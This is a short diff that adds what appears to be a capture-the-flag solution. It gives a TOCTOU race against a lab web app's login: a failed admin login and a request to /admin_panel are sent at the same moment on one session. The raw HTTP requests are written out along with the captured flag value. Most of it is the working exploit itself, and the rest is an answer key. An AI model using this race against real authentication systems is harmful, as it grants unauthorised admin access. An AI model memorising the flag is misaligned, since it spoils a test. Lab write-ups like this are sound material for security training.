@@ -1,0 +1,7 @@
+# TOCTOU race: 1) Login as test:test to get session S. 2) Concurrently send POST /login (admin, wrong pass) with session S and GET /admin_panel with session S. Server sets is_admin=True before password check fails - admin panel returns flag{3d582313-fe30-457d-ac42-193b066d56c0}
+
+GET / HTTP/1.1
+Host: 172.17.0.1:40625
+Content-Length: 322
+
+POST /login HTTP/1.1\r\nHost: 172.17.0.1:40625\r\nCookie: session=<SESSION_FROM_TEST_LOGIN>\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin&password=wrongpassword\r\n\r\n---RACE WITH---\r\n\r\nGET /admin_panel HTTP/1.1\r\nHost: 172.17.0.1:40625\r\nCookie: session=<SESSION_FROM_TEST_LOGIN>\r\n\r\n
